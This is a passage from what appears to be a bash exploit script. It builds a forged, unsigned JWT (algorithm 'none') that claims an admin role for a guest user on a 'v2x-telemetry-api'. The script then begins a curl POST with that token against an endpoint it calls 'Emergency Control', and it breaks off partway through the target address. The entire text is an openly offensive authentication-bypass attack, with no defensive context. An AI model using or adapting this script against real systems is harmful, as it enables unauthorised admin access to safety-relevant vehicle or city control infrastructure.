#!/bin/bash
FORGED_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3RfcmlkZXIiLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJ3b3Zlbi1jaXR5LWF1dGgiLCJhdWQiOiJ2MngtdGVsZW1ldHJ5LWFwaSJ9."

echo "[*] Launching Signature Validation Bypass against Emergency Control..."
curl -i -X POST \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' \
  http://192.168.1
